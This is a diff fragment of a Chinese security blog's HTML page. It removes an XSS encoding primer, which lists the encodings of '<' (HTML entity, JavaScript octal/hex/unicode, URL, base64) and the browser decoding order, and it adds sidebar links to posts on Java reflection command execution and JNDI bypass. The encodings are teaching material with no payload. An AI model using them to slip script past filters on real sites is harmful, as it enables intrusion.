-fi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>用法: <code>exportbin.sh &lt;path to the binary&gt;  &lt;target floder&gt;</code></p>
-<ul>
-<li><a target="_blank" rel="noopener" href="http://www.metashock.de/2012/11/export-binary-with-lib-dependencies/">http://www.metashock.de/2012/11/export-binary-with-lib-dependencies/</a></li>
-</ul>
-
-	
-	</div>
-  <a type="button" href="/2017/03/09/copy-shared-lib.html#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2017/03/02/xss-encode-decode.html" >xss基础编码</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2017-03-02  </div>
-		</div>
-	</div>
-	
-
-
-			<!--
-<div class="entry">
-  <div class="row">
-	
-	
-		<p>html的实体编码，比如十进制编码和十六进制编码，需要放在html标签里面。</p>
-<pre class="line-numbers language-none"><code class="language-none">Fun fact Decoding Order:
-1. HTML Decoding
-2. URL Decoding
-3. Javascript Decoding
-
-http:&#x2F;&#x2F;slides.com&#x2F;mscasharjaved&#x2F;deck-13#&#x2F;169<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>三种编码，对于html来说是(10进制和16进制）</p>
-<h3 id="html尖括号"><a href="#html尖括号" class="headerlink" title="html尖括号"></a>html尖括号</h3><ul>
-<li>十进制：<code>&amp;#60;</code> </li>
-<li>html十六: <code>&amp;#x3c;</code></li>
-</ul>
-<h3 id="javascript的八进制和16进制以及unicode编码"><a href="#javascript的八进制和16进制以及unicode编码" class="headerlink" title="javascript的八进制和16进制以及unicode编码:"></a>javascript的八进制和16进制以及unicode编码:</h3><p>尖括号－－&gt; </p>
-<ul>
-<li>八进制:<code>\74</code> </li>
-<li>十六进制: <code>\x3c</code></li>
-<li>unicode编码: <code>\u003c</code></li>
-</ul>
-<h3 id="url编码及base64编码-lt"><a href="#url编码及base64编码-lt" class="headerlink" title="url编码及base64编码(&lt;)"></a>url编码及base64编码(&lt;)</h3><ul>
-<li>url: %3C </li>
-<li>base64: PA==</li>
-</ul>
-	
-
-	</div>
-  <a type="button" href="/2017/03/02/xss-encode-decode.html#more" class="btn btn-default more">Read More</a>
-</div>
-
--->
-<div class="entry">
-  <div class="row">
-	
-	
-		<p>html的实体编码，比如十进制编码和十六进制编码，需要放在html标签里面。</p>
-<pre class="line-numbers language-none"><code class="language-none">Fun fact Decoding Order:
-1. HTML Decoding
-2. URL Decoding
-3. Javascript Decoding
-
-http:&#x2F;&#x2F;slides.com&#x2F;mscasharjaved&#x2F;deck-13#&#x2F;169<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>三种编码，对于html来说是(10进制和16进制）</p>
-<h3 id="html尖括号"><a href="#html尖括号" class="headerlink" title="html尖括号"></a>html尖括号</h3><ul>
-<li>十进制：<code>&amp;#60;</code> </li>
-<li>html十六: <code>&amp;#x3c;</code></li>
-</ul>
-<h3 id="javascript的八进制和16进制以及unicode编码"><a href="#javascript的八进制和16进制以及unicode编码" class="headerlink" title="javascript的八进制和16进制以及unicode编码:"></a>javascript的八进制和16进制以及unicode编码:</h3><p>尖括号－－&gt; </p>
-<ul>
-<li>八进制:<code>\74</code> </li>
-<li>十六进制: <code>\x3c</code></li>
-<li>unicode编码: <code>\u003c</code></li>
-</ul>
-<h3 id="url编码及base64编码-lt"><a href="#url编码及base64编码-lt" class="headerlink" title="url编码及base64编码(&lt;)"></a>url编码及base64编码(&lt;)</h3><ul>
-<li>url: %3C </li>
-<li>base64: PA==</li>
-</ul>
-	
-	</div>
-  <a type="button" href="/2017/03/02/xss-encode-decode.html#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -698,6 +762,8 @@ http:&#x2F;&#x2F;slides.com&#x2F;mscasharjaved&#x2F;deck-13#&#x2F;169<span aria-
 		
 			<li><a href="/categories/Fun/">Fun<span>3</span></a></li>
 		
+			<li><a href="/categories/Java/">Java<span>3</span></a></li>
+		
 			<li><a href="/categories/Learning/">Learning<span>16</span></a></li>
 		
 			<li><a href="/categories/PWN/">PWN<span>2</span></a></li>
@@ -723,23 +789,23 @@ http:&#x2F;&#x2F;slides.com&#x2F;mscasharjaved&#x2F;deck-13#&#x2F;169<span aria-
   <ul class="entry list-unstyled">
     
       <li>
+        <a href="/2022/03/30/Load_Class_In_Multi_JavaVersion.html" ><i class="fa fa-file-o"></i>低版本Java运行高版的Class</a>
+      </li>
+    
+      <li>
+        <a href="/2022/03/22/java-reflection-shell.html" ><i class="fa fa-file-o"></i>Java安全笔记(2)-反射执行系统命令</a>
+      </li>
+    
+      <li>
+        <a href="/2022/03/22/java-reflection.html" ><i class="fa fa-file-o"></i>Java安全笔记(1)-反射机制</a>
+      </li>
+    
+      <li>
         <a href="/2022/03/21/jndi-exec-by-mvel.html" ><i class="fa fa-file-o"></i>JNDI Bypass - MVEL</a>
       </li>
     
       <li>
         <a href="/2022/03/18/from-spring-boot-to-getshell.html" ><i class="fa fa-file-o"></i>从Spring Boot H2 Database到Ge...</a>
-      </li>
-    
-      <li>
-        <a href="/2021/08/06/windows-ntlm-smb-scan.html" ><i class="fa fa-file-o"></i>NTLM端口信息探测</a>
-      </li>
-    
-      <li>
-        <a href="/2021/08/02/siem-on-elk.html" ><i class="fa fa-file-o"></i>SIEM On ELK</a>
-      </li>
-    
-      <li>
-        <a href="/2021/07/29/silverFish.html" ><i class="fa fa-file-o"></i>Silver调查报告</a>
       </li>
     
   </ul>
